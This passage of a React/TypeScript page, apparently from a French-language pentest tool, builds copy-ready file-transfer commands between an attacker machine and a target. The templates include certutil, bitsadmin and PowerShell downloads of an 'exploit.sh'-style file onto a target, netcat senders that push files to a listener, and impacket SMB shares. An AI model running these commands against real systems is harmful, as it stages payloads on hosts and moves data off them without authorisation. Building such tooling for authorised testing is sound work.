import React, { useEffect, useMemo, useRef, useState } from 'react';
import { toast } from 'react-hot-toast';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import {
  Server,
  MonitorSmartphone,
  Upload,
  Download,
  Globe,
  FileText,
  Shield,
  Network,
  Folder,
  Copy,
  Trash2,
  ChevronDown,
  ChevronUp,
} from 'lucide-react';

type OSEnum = 'linux' | 'windows' | 'macos';

interface ScenarioState {
  source: {
    os: OSEnum;
    ip: string;
    port: string; // listen port (HTTP/NC/FTP)
    sshPort?: string; // for scp/sftp when source needs SSH access
  };
  destination: {
    os: OSEnum;
    ip: string;
    sshPort: string; // for scp/sftp
    port?: string; // for HTTP server when destination is source
    filename: string;
    destPath: string; // folder or full path
  };
  direction: 'upload' | 'download'; // upload: source -> destination, download: destination -> source
}

interface HistoryItem {
  id: string;
  method: string;
  step: string;
  command: string;
  context: any;
  createdAt: string;
}

const STORAGE_KEY_HISTORY = 'fileTransferHistory';

function buildDestFullPath(destPath: string, filename: string, os: OSEnum): string {
  const isWindows = os === 'windows';
  const sep = isWindows ? '\\' : '/';
  if (!destPath) return isWindows ? `C:\\temp\\${filename}` : `/tmp/${filename}`;
  const endsWithSep = isWindows ? /\\$/.test(destPath) : /\/$/.test(destPath);
  return endsWithSep ? `${destPath}${filename}` : `${destPath}${sep}${filename}`;
}

function copyToClipboard(cmd: string) {
  navigator.clipboard.writeText(cmd).then(() => {
    toast.success('Commande copiée');
  }).catch(() => toast.error('Copie impossible'));
}

const SectionHeader: React.FC<{ title: string; right?: React.ReactNode }> = ({ title, right }) => (
  <div className="flex items-center justify-between mb-3">
    <h3 className="text-lg font-semibold text-slate-100">{title}</h3>
    {right}
  </div>
);

export const FileTransferPage: React.FC = () => {
  // Scénario appliqué (utilisé pour générer les commandes)
  const [scenario, setScenario] = useState<ScenarioState>({
    source: { os: 'linux', ip: '10.10.14.1', port: '8000' },
    destination: { os: 'linux', ip: '10.10.10.10', sshPort: '22', port: '8000', filename: 'exploit.sh', destPath: '/tmp' },
    direction: 'download',
  });
  // Brouillon (modifications en cours avant d'appuyer sur "Générer")
  const [draftScenario, setDraftScenario] = useState<ScenarioState>(() => ({ ...scenario }));
  const [showScenarioContent, setShowScenarioContent] = useState(false);

  const [expanded, setExpanded] = useState<Record<string, boolean>>({
    http: true,
    scp: false,
    netcat: false,
    base64: false,
    ftp: false,
    smb: false,
  });

  const [history, setHistory] = useState<HistoryItem[]>(() => {
    try {
      const raw = localStorage.getItem(STORAGE_KEY_HISTORY);
      return raw ? JSON.parse(raw) : [];
    } catch {
      return [];
    }
  });

  useEffect(() => {
    localStorage.setItem(STORAGE_KEY_HISTORY, JSON.stringify(history));
  }, [history]);

  const sourceLabel = useMemo(() => {
    const osLabel = scenario.source.os === 'windows' ? 'Windows' : scenario.source.os === 'macos' ? 'macOS' : 'Linux';
    return scenario.direction === 'upload' ? `📤 MACHINE DE DÉPART (${osLabel})` : `📥 MACHINE DE DÉPART (${osLabel})`;
  }, [scenario.source.os, scenario.direction]);

  const destinationLabel = useMemo(() => {
    const osLabel = scenario.destination.os === 'windows' ? 'Windows' : scenario.destination.os === 'macos' ? 'macOS' : 'Linux';
    return scenario.direction === 'upload' ? `📤 MACHINE D'ARRIVÉE (${osLabel})` : `📥 MACHINE D'ARRIVÉE (${osLabel})`;
  }, [scenario.destination.os, scenario.direction]);

  // Labels dynamiques selon la direction
  const getDirectionLabel = (method: string) => {
    if (scenario.direction === 'upload') {
      return `${method} : Envoi de fichier`;
    } else {
      return `${method} : Récupération de fichier`;
    }
  };

  const destFullPath = buildDestFullPath(scenario.destination.destPath, scenario.destination.filename, scenario.destination.os);

  function onCopy(method: string, step: string, command: string) {
    copyToClipboard(command);
    setHistory((prev) => [
      {
        id: Date.now().toString(),
        method,
        step,
        command,
        context: scenario,
        createdAt: new Date().toISOString(),
      },
      ...prev,
    ]);
  }

  function exportHistory() {
    const blob = new Blob([JSON.stringify(history, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'file-transfer-history.json';
    a.click();
    URL.revokeObjectURL(url);
  }

  function importHistory(file: File) {
    const reader = new FileReader();
    reader.onload = () => {
      try {
        const data = JSON.parse(String(reader.result));
        if (Array.isArray(data)) setHistory(data as HistoryItem[]);
      } catch {
        toast.error('Fichier invalide');
      }
    };
    reader.readAsText(file);
  }

  const fileInputRef = useRef<HTMLInputElement | null>(null);

  // Command templates - adaptées selon la direction
  const httpServerPython3 = `python3 -m http.server ${scenario.source.port} --bind 0.0.0.0`;
  const httpServerPython2 = `python -m SimpleHTTPServer ${scenario.source.port}`;
  const httpServerPHP = `php -S 0.0.0.0:${scenario.source.port}`;
  const httpServerRuby = `ruby -run -e httpd . -p ${scenario.source.port}`;
  const httpServerNode = `npx http-server -p ${scenario.source.port} --host 0.0.0.0`;

  // URL et commandes adaptées selon la direction
  const httpURL = scenario.direction === 'upload' 
    ? `http://${scenario.source.ip}:${scenario.source.port}/${scenario.destination.filename}`
    : `http://${scenario.destination.ip}:${scenario.destination.port}/${scenario.destination.filename}`;
    
  // Commandes de téléchargement (depuis la machine de destination)
  const wgetCmd = `wget "${httpURL}" -O "${destFullPath}"`;
  const curlCmd = `curl -o "${destFullPath}" "${httpURL}"`;
  const pwshCmd = `Invoke-WebRequest -Uri "${httpURL}" -OutFile "${destFullPath.replace(/\\/g, '\\\\')}"`;
  const certutilCmd = `certutil -urlcache -split -f "${httpURL}" "${destFullPath.replace(/\\/g, '\\\\')}"`;
  const bitsadminCmd = `bitsadmin /transfer myDownloadJob /download /priority normal "${httpURL}" "${destFullPath.replace(/\\/g, '\\\\')}"`;

  // Commandes SCP adaptées selon la direction
  const scpToTarget = scenario.direction === 'upload' 
    ? `scp "${scenario.destination.filename}" ${'user'}@${scenario.destination.ip}:"${destFullPath}"`
    : `scp ${'user'}@${scenario.destination.ip}:"${scenario.destination.filename}" "${destFullPath}"`;
    
  const scpCustomPort = scenario.direction === 'upload'
    ? `scp -P ${scenario.destination.sshPort} "${scenario.destination.filename}" ${'user'}@${scenario.destination.ip}:"${destFullPath}"`
    : `scp -P ${scenario.destination.sshPort} ${'user'}@${scenario.destination.ip}:"${scenario.destination.filename}" "${destFullPath}"`;
    
  const sftpInteractive = `sftp ${'user'}@${scenario.destination.ip}`;

  // Commandes Netcat adaptées selon la direction
  const ncReceiver = scenario.direction === 'upload' 
    ? (scenario.destination.os === 'windows'
        ? `ncat -l -p ${scenario.source.port} > "${destFullPath.replace(/\\/g, '\\\\')}"`
        : `nc -l -p ${scenario.source.port} > "${destFullPath}"`)
    : (scenario.source.os === 'windows'
        ? `ncat -l -p ${scenario.destination.port || '8000'} > "${destFullPath.replace(/\\/g, '\\\\')}"`
        : `nc -l -p ${scenario.destination.port || '8000'} > "${destFullPath}"`);
        
  const ncSender = scenario.direction === 'upload'
    ? (scenario.destination.os === 'windows'
        ? `ncat ${scenario.destination.ip} ${scenario.source.port} < "${scenario.destination.filename.replace(/\\/g, '\\\\')}"`
        : `nc ${scenario.destination.ip} ${scenario.source.port} < "${scenario.destination.filename}"`)
    : (scenario.source.os === 'windows'
        ? `ncat ${scenario.source.ip} ${scenario.destination.port || '8000'} < "${scenario.destination.filename.replace(/\\/g, '\\\\')}"`
        : `nc ${scenario.source.ip} ${scenario.destination.port || '8000'} < "${scenario.destination.filename}"`);
        
  const ncTimeout = `timeout 30 ${ncSender}`;

  // Commandes Base64 adaptées selon la direction
  const b64EncodeLinux = scenario.direction === 'upload'
    ? `base64 -w 0 "${scenario.destination.filename}"`
    : `base64 -w 0 "${scenario.destination.filename}"`;
    
  const b64EncodeWindows = scenario.direction === 'upload'
    ? `certutil -encode "${scenario.destination.filename.replace(/\\/g, '\\\\')}" encoded.txt`
    : `certutil -encode "${scenario.destination.filename.replace(/\\/g, '\\\\')}" encoded.txt`;
    
  const b64DecodeLinux = `echo "BASE64_STRING" | base64 -d > "${destFullPath}"`;
  const b64DecodeWindows = `certutil -decode encoded.txt "${destFullPath.replace(/\\/g, '\\\\')}"`;

  // Commandes FTP adaptées selon la direction
  const ftpServer = `python3 -m pyftpdlib -p 21 -w`;
  const ftpServerAuth = `python3 -m pyftpdlib -p 21 -u user -P pass`;
  
  const ftpClientLinux = scenario.direction === 'upload'
    ? `wget ftp://${scenario.source.ip}/${scenario.destination.filename} -O "${destFullPath}"`
    : `wget ftp://${scenario.destination.ip || scenario.source.ip}/${scenario.destination.filename} -O "${destFullPath}"`;
    
  const ftpClientWindows = scenario.direction === 'upload'
    ? `powershell -c "(New-Object Net.WebClient).DownloadFile('ftp://${scenario.source.ip}/${scenario.destination.filename}', '${destFullPath.replace(/\\/g, '\\\\')}')"`
    : `powershell -c "(New-Object Net.WebClient).DownloadFile('ftp://${scenario.destination.ip || scenario.source.ip}/${scenario.destination.filename}', '${destFullPath.replace(/\\/g, '\\\\')}')"`;

  // Commandes SMB adaptées selon la direction
  const smbServer = `impacket-smbserver share . -smb2support`;
  const smbServerAuth = `impacket-smbserver share . -smb2support -user user -password pass`;
  
  const smbCopy = scenario.direction === 'upload'
    ? `copy "\\\\${scenario.source.ip}\\share\\${scenario.destination.filename}" "${destFullPath.replace(/\\/g, '\\\\')}"`
    : `copy "\\\\${scenario.destination.ip || scenario.source.ip}\\share\\${scenario.destination.filename}" "${destFullPath.replace(/\\/g, '\\\\')}"`;
    
  const smbRobocopy = scenario.direction === 'upload'
    ? `robocopy "\\\\${scenario.source.ip}\\share" "${(scenario.destination.destPath || 'C:\\temp').replace(/\\/g, '\\\\')}" "${scenario.destination.filename}"`
    : `robocopy "\\\\${scenario.destination.ip || scenario.source.ip}\\share" "${(scenario.destination.destPath || 'C:\\temp').replace(/\\/g, '\\\\')}" "${scenario.destination.filename}"`;

  return (
    <div className="app-layout">
      {/* Header */}
      <div className="main-header p-6">
        <div className="flex-between mb-6">
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-3">
              <img src="/logo.png" alt="AuditMapper" className="w-8 h-8 rounded-lg opacity-80" />
              <div>
                <h1 className="text-2xl font-bold text-slate-100">Transfert de Fichiers</h1>
                <p className="text-slate-400">Techniques claires et commandes pré-remplies selon votre scénario</p>
              </div>
            </div>
          </div>
        </div>

        {/* Scenario configuration (supprimée du header - déplacée en bas) */}
      </div>

      {/* Main content */}
      <div className="main-content">
        <div className="content-area">
          <div className="content-main p-6 space-y-6">
            {/* 🎯 Configuration du Scénario (déplacée ici) */}
            <Card className="border-slate-700 bg-slate-800">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="text-slate-100">🎯 Configuration du Scénario</CardTitle>
                  <div className="flex items-center gap-2">
                    <div className="hidden md:block text-xs text-slate-400 mr-2">
                      {scenario.direction === 'upload' ? (
                        `📤 ${scenario.source.ip}:${scenario.source.port} → ${scenario.destination.ip} • ${scenario.destination.filename} → ${destFullPath}`
                      ) : (
                        `📥 ${scenario.destination.ip}:${scenario.destination.port || scenario.source.port} → ${scenario.source.ip} • ${scenario.destination.filename} → ${destFullPath}`
                      )}
                    </div>
                    <Button
                      variant="outline"
                      size="sm"
                      className="bg-blue-600 hover:bg-blue-700 text-white border-blue-600"
                      onClick={() => {
                        setScenario({ ...draftScenario });
                        toast.success('Commandes générées');
                      }}
                    >
                      🚀 Générer les Commandes
                    </Button>
                    <Button
                      variant="outline"
                      size="sm"
                      className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600"
                      onClick={() => setShowScenarioContent((v) => !v)}
                    >
                      {showScenarioContent ? 'Masquer' : 'Modifier'}
                    </Button>
                  </div>
                </div>
              </CardHeader>
              {showScenarioContent && (
              <CardContent>
                <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
                  {/* Source - Amélioré */}
                  <Card className="border-slate-700 bg-slate-800">
                    <CardHeader>
                      <CardTitle className="flex items-center gap-2 text-slate-100">
                        <MonitorSmartphone className="w-4 h-4" /> Machine de Départ
                      </CardTitle>
                      <div className="text-xs text-slate-400 mt-1">
                        {draftScenario.direction === 'upload' ? '📤 Envoie le fichier' : '📥 Reçoit le fichier'}
                      </div>
                    </CardHeader>
                    <CardContent className="space-y-3">
                      <div>
                        <label className="text-sm text-slate-400">Système d'exploitation</label>
                        <Select value={draftScenario.source.os} onValueChange={(v: OSEnum) => setDraftScenario((s) => ({...s, source: {...s.source, os: v}}))}>
                          <SelectTrigger className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100"><SelectValue /></SelectTrigger>
                          <SelectContent className="bg-slate-800 border-slate-600">
                            <SelectItem value="linux">🐧 Linux (Debian/Ubuntu/CentOS)</SelectItem>
                            <SelectItem value="windows">🪟 Windows (10/11/Server)</SelectItem>
                            <SelectItem value="macos">🍎 macOS (Monterey/Ventura)</SelectItem>
                          </SelectContent>
                        </Select>
                      </div>
                      
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                        <div>
                          <label className="text-sm text-slate-400">Adresse IP</label>
                          <Input 
                            value={draftScenario.source.ip} 
                            onChange={(e) => setDraftScenario((s) => ({...s, source: {...s.source, ip: e.target.value}}))} 
                            className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" 
                            placeholder="192.168.1.100"
                          />
                        </div>
                        <div>
                          <label className="text-sm text-slate-400">Port HTTP</label>
                          <Input 
                            value={draftScenario.source.port} 
                            onChange={(e) => setDraftScenario((s) => ({...s, source: {...s.source, port: e.target.value}}))} 
                            className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" 
                            placeholder="8000"
                          />
                        </div>
                      </div>
                      
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                        <div>
                          <label className="text-sm text-slate-400">Port Netcat</label>
                          <Input 
                            value={draftScenario.source.port} 
                            onChange={(e) => setDraftScenario((s) => ({...s, source: {...s.source, port: e.target.value}}))} 
                            className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" 
                            placeholder="4444"
                          />
                        </div>
                        <div>
                          <label className="text-sm text-slate-400">Port FTP</label>
                          <Input 
                            value="21" 
                            className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" 
                            disabled
                          />
                        </div>
                      </div>
                      
                      <div className="text-xs text-slate-400 bg-slate-700/50 p-2 rounded border border-slate-600">
                        🔧 <strong>Ports par défaut :</strong> HTTP: 8000, Netcat: 4444, FTP: 21, SMB: 445
                      </div>
                    </CardContent>
                  </Card>

                  {/* Direction selector - Agrandi */}
                  <div className="hidden lg:flex flex-col items-center justify-center gap-4 p-4 bg-slate-700/30 rounded-lg border border-slate-600">
                    <div className="text-center">
                      <h4 className="text-lg font-semibold text-slate-200 mb-3">🎯 Direction du Transfert</h4>
                      <div className="space-y-3">
                        <div className="flex items-center gap-3">
                          <div className={`p-2 rounded-lg border-2 ${draftScenario.direction === 'upload' ? 'border-blue-500 bg-blue-500/20' : 'border-slate-600 bg-slate-700/50'}`}>
                            <input
                              type="radio"
                              id="upload"
                              name="direction"
                              value="upload"
                              checked={draftScenario.direction === 'upload'}
                              onChange={(e) => setDraftScenario((s) => ({...s, direction: e.target.value as 'upload' | 'download'}))}
                              className="mr-2"
                            />
                            <label htmlFor="upload" className="text-slate-200 cursor-pointer">
                              📤 Envoi de fichier
                            </label>
                          </div>
                          <div className={`p-2 rounded-lg border-2 ${draftScenario.direction === 'download' ? 'border-blue-500 bg-blue-500/20' : 'border-slate-600 bg-slate-700/50'}`}>
                            <input
                              type="radio"
                              id="download"
                              name="direction"
                              value="download"
                              checked={draftScenario.direction === 'download'}
                              onChange={(e) => setDraftScenario((s) => ({...s, direction: e.target.value as 'upload' | 'download'}))}
                              className="mr-2"
                            />
                            <label htmlFor="download" className="text-slate-200 cursor-pointer">
                              📥 Récupération de fichier
                            </label>
                          </div>
                        </div>
                        
                        <div className="text-center">
                          <div className="text-slate-300 text-3xl mb-2">
                            {draftScenario.direction === 'upload' ? '➡️' : '⬅️'}
                          </div>
                          <div className="text-xs text-slate-400">
                            {draftScenario.direction === 'upload' 
                              ? 'Machine de Départ → Machine d\'Arrivée'
                              : 'Machine d\'Arrivée → Machine de Départ'
                            }
                          </div>
                        </div>
                        
                        <div className="text-xs text-slate-400 bg-slate-800 p-2 rounded border border-slate-600">
                          💡 <strong>Conseil :</strong> {draftScenario.direction === 'upload' 
                            ? 'Utilisez ce mode pour envoyer des fichiers depuis votre machine vers une cible'
                            : 'Utilisez ce mode pour récupérer des fichiers depuis une cible vers votre machine'
                          }
                        </div>
                      </div>
                    </div>
                  </div>

                                    {/* Destination - Amélioré */}
                  <Card className="border-slate-700 bg-slate-800">
                    <CardHeader>
                      <CardTitle className="flex items-center gap-2 text-slate-100">
                        <TargetIcon /> Machine d'Arrivée
                      </CardTitle>
                      <div className="text-xs text-slate-400 mt-1">
                        {draftScenario.direction === 'upload' ? '📤 Reçoit le fichier' : '📥 Envoie le fichier'}
                      </div>
                    </CardHeader>
                    <CardContent className="space-y-3">
                      <div>
                        <label className="text-sm text-slate-400">Système d'exploitation</label>
                        <Select value={draftScenario.destination.os} onValueChange={(v: OSEnum) => setDraftScenario((s) => ({...s, destination: {...s.destination, os: v}}))}>
                          <SelectTrigger className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100"><SelectValue /></SelectTrigger>
                          <SelectContent className="bg-slate-800 border-slate-600">
                            <SelectItem value="linux">🐧 Linux (Debian/Ubuntu/CentOS)</SelectItem>
                            <SelectItem value="windows">🪟 Windows (10/11/Server)</SelectItem>
                            <SelectItem value="macos">🍎 macOS (Monterey/Ventura)</SelectItem>
                          </SelectContent>
                        </Select>
                      </div>
                      
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                        <div>
                          <label className="text-sm text-slate-400">Adresse IP</label>
                          <Input 
                            value={draftScenario.destination.ip} 
                            onChange={(e) => setDraftScenario((s) => ({...s, destination: {...s.destination, ip: e.target.value}}))} 
                            className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" 
                            placeholder="192.168.1.200"
                          />
                        </div>
                        <div>
                          <label className="text-sm text-slate-400">Port SSH</label>
                          <Input 
                            value={draftScenario.destination.sshPort} 
                            onChange={(e) => setDraftScenario((s) => ({...s, destination: {...s.destination, sshPort: e.target.value}}))} 
                            className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" 
                            placeholder="22"
                          />
                        </div>
                      </div>
                      
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                        <div>
                          <label className="text-sm text-slate-400">Port HTTP (optionnel)</label>
                          <Input 
                            value={draftScenario.destination.port || ''} 
                            onChange={(e) => setDraftScenario((s) => ({...s, destination: {...s.destination, port: e.target.value}}))} 
                            className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" 
                            placeholder="8000" 
                          />
                        </div>
                        <div>
                          <label className="text-sm text-slate-400">Port SMB</label>
                          <Input 
                            value="445" 
                            className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" 
                            disabled
                          />
                        </div>
                      </div>
                      
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                        <div>
                          <label className="text-sm text-slate-400">Nom du fichier</label>
                          <Input 
                            value={draftScenario.destination.filename} 
                            onChange={(e) => setDraftScenario((s) => ({...s, destination: {...s.destination, filename: e.target.value}}))} 
                            className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" 
                            placeholder="exploit.sh"
                          />
                        </div>
                        <div>
                          <label className="text-sm text-slate-400">Taille estimée</label>
                          <Input 
                            value="1-10 MB" 
                            className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" 
                            disabled
                          />
                        </div>
                      </div>
                      
                      <div>
                        <label className="text-sm text-slate-400">Chemin de destination</label>
                        <Input 
                          value={draftScenario.destination.destPath} 
                          onChange={(e) => setDraftScenario((s) => ({...s, destination: {...s.destination, destPath: e.target.value}}))} 
                          className="mt-1 h-9 bg-slate-700 border-slate-600 text-slate-100" 
                          placeholder={draftScenario.destination.os === 'windows' ? 'C:\\temp' : '/tmp'}
                        />
                      </div>
                      
                      <div className="text-xs text-slate-400 bg-slate-700/50 p-2 rounded border border-slate-600">
                        📁 <strong>Chemin final :</strong> <code className="text-slate-200">{buildDestFullPath(draftScenario.destination.destPath, draftScenario.destination.filename, draftScenario.destination.os)}</code>
                      </div>
                      
                      <div className="text-xs text-slate-400 bg-slate-700/50 p-2 rounded border border-slate-600">
                        🔧 <strong>Ports par défaut :</strong> SSH: 22, HTTP: 8000, SMB: 445, FTP: 21
                      </div>
                    </CardContent>
                  </Card>
                </div>
                
                {/* Boutons d'action en bas */}
                <div className="flex items-center justify-center gap-4 pt-6 border-t border-slate-600">
                  <Button
                    variant="default"
                    size="lg"
                    className="bg-blue-600 hover:bg-blue-700 px-8"
                    onClick={() => {
                      setScenario({ ...draftScenario });
                      setShowScenarioContent(false);
                      toast.success('Commandes générées avec succès !');
                    }}
                  >
                    🚀 Générer les Commandes
                  </Button>
                  <Button
                    variant="outline"
                    size="lg"
                    className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600 px-8"
                    onClick={() => setDraftScenario({
                      source: { os: 'linux', ip: '10.10.14.1', port: '8000' },
                      destination: { os: 'linux', ip: '10.10.10.10', sshPort: '22', port: '8000', filename: 'exploit.sh', destPath: '/tmp' },
                      direction: 'download',
                    })}
                  >
                    🔄 Réinitialiser
                  </Button>
                  <Button
                    variant="outline"
                    size="lg"
                    className="bg-green-700 border-green-600 text-green-200 hover:bg-green-600 px-8"
                    onClick={() => {
                      // Sauvegarder le scénario actuel
                      localStorage.setItem('savedFileTransferScenario', JSON.stringify(draftScenario));
                      toast.success('Scénario sauvegardé !');
                    }}
                  >
                    💾 Sauvegarder
                  </Button>
                </div>
              </CardContent>
              )}
            </Card>
            <SectionHeader
              title="📋 Méthodes de Transfert Disponibles"
              right={
                <div className="flex gap-2">
                  <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setExpanded({ http: true, scp: true, netcat: true, base64: true, ftp: true, smb: true })}>📖 Tout déplier</Button>
                  <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setExpanded({ http: false, scp: false, netcat: false, base64: false, ftp: false, smb: false })}>📕 Tout replier</Button>
                </div>
              }
            />

            {/* HTTP */}
            <Card className="border-slate-700 bg-slate-800">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="flex items-center gap-2 text-slate-100"><Globe className="w-4 h-4" /> {getDirectionLabel('Serveur HTTP')}</CardTitle>
                  <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setExpanded((e) => ({...e, http: !e.http}))}>
                    {expanded.http ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                  </Button>
                </div>
              </CardHeader>
              {expanded.http && (
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
                    <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {sourceLabel}</div>
                    <div className="space-y-2">
                      {[{label: 'Python 3 (recommandé)', cmd: httpServerPython3}, {label: 'Python 2 (legacy)', cmd: httpServerPython2}, {label: 'PHP', cmd: httpServerPHP}, {label: 'Ruby', cmd: httpServerRuby}, {label: 'Node.js', cmd: httpServerNode}].map(({label, cmd}) => (
                        <div key={label} className="bg-slate-800 rounded border border-slate-600">
                          <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                            <span className="text-xs text-slate-400">{label}</span>
                            <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('http', 'source', cmd)}><Copy className="w-3 h-3" /></Button>
                          </div>
                          <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                        </div>
                      ))}
                    </div>
                  </div>
                  <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
                                            <div className="text-xs font-semibold text-slate-300 mb-2">🎯 {destinationLabel}</div>
                        <div className="space-y-2">
                          {(scenario.destination.os === 'windows' ? [
                            {label: 'PowerShell (Windows)', cmd: pwshCmd},
                            {label: 'certutil (Windows)', cmd: certutilCmd},
                            {label: 'bitsadmin (Windows)', cmd: bitsadminCmd},
                          ] : [
                            {label: 'wget (Linux/macOS)', cmd: wgetCmd},
                            {label: 'curl (Linux/macOS)', cmd: curlCmd},
                          ]).map(({label, cmd}) => (
                            <div key={label} className="bg-slate-800 rounded border border-slate-600">
                              <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                                <span className="text-xs text-slate-400">{label}</span>
                                <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('http', 'destination', cmd)}><Copy className="w-3 h-3" /></Button>
                              </div>
                              <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                            </div>
                          ))}
                        </div>
                  </div>
                </div>
              </CardContent>
              )}
            </Card>

            {/* SCP/SFTP */}
            <Card className="border-slate-700 bg-slate-800">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="flex items-center gap-2 text-slate-100"><Shield className="w-4 h-4" /> {getDirectionLabel('SCP / SFTP')}</CardTitle>
                  <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setExpanded((e) => ({...e, scp: !e.scp}))}>
                    {expanded.scp ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                  </Button>
                </div>
              </CardHeader>
              {expanded.scp && (
              <CardContent className="space-y-2">
                <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
                  <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {sourceLabel}</div>
                  <div className="space-y-2">
                    {[{label: 'SCP vers la cible', cmd: scpToTarget}, {label: 'SCP avec port personnalisé', cmd: scpCustomPort}, {label: 'SFTP interactif', cmd: sftpInteractive}].map(({label, cmd}) => (
                      <div key={label} className="bg-slate-800 rounded border border-slate-600">
                        <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                          <span className="text-xs text-slate-400">{label}</span>
                          <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('scp', 'source', cmd)}><Copy className="w-3 h-3" /></Button>
                        </div>
                        <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                      </div>
                    ))}
                  </div>
                  <div className="mt-2 text-xs text-slate-400">Remplacez <code>user</code> par un utilisateur valide. Assurez-vous que SSH est actif sur la cible.</div>
                </div>
              </CardContent>
              )}
            </Card>

            {/* Netcat */}
            <Card className="border-slate-700 bg-slate-800">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="flex items-center gap-2 text-slate-100"><Network className="w-4 h-4" /> {getDirectionLabel('Netcat')}</CardTitle>
                  <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setExpanded((e) => ({...e, netcat: !e.netcat}))}>
                    {expanded.netcat ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                  </Button>
                </div>
              </CardHeader>
              {expanded.netcat && (
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
                    <div className="text-xs font-semibold text-slate-300 mb-2">🎯 {destinationLabel} (récepteur)</div>
                    <div className="bg-slate-800 rounded border border-slate-600">
                      <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                        <span className="text-xs text-slate-400">Netcat récepteur</span>
                        <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('netcat', 'destination', ncReceiver)}><Copy className="w-3 h-3" /></Button>
                      </div>
                      <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{ncReceiver}</code></pre>
                    </div>
                  </div>
                  <div className="p-3 bg-slate-700/30 rounded border border-slate-600">
                    <div className="text-xs font-semibold text-slate-300 mb-2">🖥️ {sourceLabel} (envoyeur)</div>
                    {[{label: 'Netcat envoyeur', cmd: ncSender}, {label: 'Avec timeout', cmd: ncTimeout}].map(({label, cmd}) => (
                      <div key={label} className="bg-slate-800 rounded border border-slate-600 mb-2">
                        <div className="flex items-center justify-between px-2 py-1 border-b border-slate-700">
                          <span className="text-xs text-slate-400">{label}</span>
                          <Button variant="outline" size="sm" className="px-2 h-7 bg-slate-700 border-slate-600 text-slate-200" onClick={() => onCopy('netcat', 'source', cmd)}><Copy className="w-3 h-3" /></Button>
                        </div>
                        <pre className="p-2 text-xs text-slate-200 overflow-x-auto"><code>{cmd}</code></pre>
                      </div>
                    ))}
                  </div>
                </div>
              </CardContent>
              )}
            </Card>

            {/* Base64 */}
            <Card className="border-slate-700 bg-slate-800">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="flex items-center gap-2 text-slate-100"><FileText className="w-4 h-4" /> {getDirectionLabel('Base64')}</CardTitle>
                  <Button variant="outline" size="sm" className="bg-slate-700 border-slate-600 text-slate-200 hover:bg-slate-600" onClick={() => setExpanded((e) => ({...e, base64: !e.base64}))}>
                    {expanded.base64 ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                  </Button>
                </div>
              </CardHeader>
              {expanded.base64 && (
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
